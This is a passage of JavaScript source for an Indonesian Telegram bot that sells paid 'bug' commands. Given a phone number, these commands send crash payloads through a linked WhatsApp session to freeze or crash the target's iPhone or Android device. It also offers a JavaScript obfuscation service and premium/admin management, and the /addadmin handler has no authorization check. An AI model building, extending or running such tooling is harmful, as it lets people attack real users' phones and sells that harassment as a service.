\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRForce
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ZyuRNovaXz (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Baca baik-baik, bug UI ini tidak work di semua Android, hanya di HP tertentu. Yang paling bereaksi terhadap bug UI ini adalah device HP China seperti Xiaomi, Redmi, Poco, dll.
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
    await pungtion(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRNovaXz
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/ZyuRIphong (\d+)/, async (msg, match) => {
   const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug ini work di semua device dan berlangsung lama
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug ini work di semua device dan berlangsung lama
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await Xvcrash(sessions.values().next().value, jid);
    await Xvcrash(sessions.values().next().value, jid);
    await console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRIphong
╰➤ Bug berhasil dikirim ke target!
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// Enc Fiture

bot.onText(/\/encvexxuzzz/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id.toString();

    // Cek Premium User
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
            parse_mode: "MarkdownV2",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
                    [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
                ]
            }
        });
    }

    // Cek apakah balas pesan dengan file
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/encvexxuzzz`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `vexxuzzz-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        // Cek apakah file valid sebelum dienkripsi
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        // Proses enkripsi menggunakan Vincent Chaos Core
        const obfuscated = await JsConfuser.obfuscate(fileContent, getVexxuzzZObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        // Cek apakah hasil enkripsi valid
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        // Kirim file hasil enkripsi
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "✅ *File terenkripsi (Vexxuzzz Chaos Core) siap!*\n_©INAZAMI INVICTUS",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "VexxuzzZ Chaos Core Selesai");

        // Hapus file setelah dikirim
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

        // Hapus file jika ada error
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});

//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem You Id 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem You Id 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem You Id 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "⛧ ＬＩＳＴ ＰＲＥＭＩＵＭ ⛧\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin You Id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin You Id.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem You Id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin You Id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin You Id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});


console.log("Bot Telegram telah dimulai...");
